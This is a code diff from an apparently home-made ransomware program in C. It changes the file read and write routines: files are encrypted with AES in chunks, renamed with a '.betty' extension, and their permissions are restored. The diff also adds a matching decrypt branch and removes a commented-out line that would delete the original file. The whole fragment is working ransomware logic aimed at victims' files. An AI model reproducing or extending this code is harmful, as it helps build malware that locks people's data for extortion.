@@ -38,9 +38,6 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		bytes_read = (size_t)st_size - file_offset;
 	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
 	fclose(fd);
-	/* Disabled for debugging. Will remove reference to original file
-	unlink(filepath);
-	*/
 	/* update tmp buffer struct to use in main. Set end of bytes read to null, for printing later*/
 #ifndef NO_DEBUG
 	ransom->target_file_buf->buf[bytes_read] = '\0';
@@ -65,37 +62,50 @@ char *write_file(char *buffer, ransom_t *ransom)
 	int buf_size = 0;
 	size_t new_ext_len = 0, filepath_len = 0, bytes_written = 0;
 	char *new_ext = ".betty", *filepath = NULL;
-	unsigned char *encrypt_buf = NULL;
+	unsigned char *cipher_buf = NULL;
 	FILE *fd = NULL;
 
 	filepath = ransom->target_file_buf->filepath;
 	filepath_len = my_strlen(filepath);
 	new_ext_len = my_strlen(new_ext);
 	buf_size = ransom->target_file_buf->bytes_read;
-
-	/**
-	  * If filepath has ".betty" at the end of it,
-	  * the file still is bigger than 4KiB, and is getting written into.
-	  * Append ".betty" to the working file. This prevents things like
-	  * "file.txt.betty", "file.txt.betty.betty", "file.txt.betty.betty.betty"
-	  * in the case of a 12KiB+ size file.
-	  **/
-	if (find_substr_end(filepath, new_ext) == 0)
-		my_strncat(filepath, new_ext, filepath_len, new_ext_len);
-
-	if ((fd = fopen(filepath, "ab+")))
-		fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
-	else
-		return(NULL);
 	/** ENCRYPT **/
-	encrypt_buf = aes_encrypt(ransom->target_file_buf->encrypt, (unsigned char *)buffer, &buf_size);
-	if ((bytes_written = fwrite(encrypt_buf, buf_size, sizeof(char), fd)) < 1)
+	if (ransom->cipher_flag == 'e')
+	{
+		/**
+		  * If filepath has ".betty" at the end of it,
+		  * the file still is bigger than 4KiB, and is getting written into.
+		  * Append ".betty" to the working file. This prevents things like
+		  * "file.txt.betty", "file.txt.betty.betty", "file.txt.betty.betty.betty"
+		  * in the case of a 12KiB+ size file.
+		  **/
+		if (find_substr_end(filepath, new_ext) == 0)
+			my_strncat(filepath, new_ext, filepath_len, new_ext_len);
+
+		if ((fd = fopen(filepath, "ab+")))
+			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+		else
+			return(NULL);
+		cipher_buf = aes_encrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+	}
+	/** DECRYPT **/
+	else if (ransom->cipher_flag == 'd')
+	{
+		if (find_substr_end(filepath, new_ext) != 0)
+			filepath[filepath_len - new_ext_len] = '\0';
+		if ((fd = fopen(filepath, "ab+")))
+			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+		else
+			return(NULL);
+		cipher_buf = aes_decrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+	}
+	if ((bytes_written = fwrite(cipher_buf, buf_size, sizeof(char), fd)) < 1)
 	{
 #ifndef NO_DEBUG
 		fprintf(stderr, "No bytes written\n");
 #endif
 	}
-	free(encrypt_buf);
+	free(cipher_buf);
 	fclose(fd);
 	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
 	return(buffer);
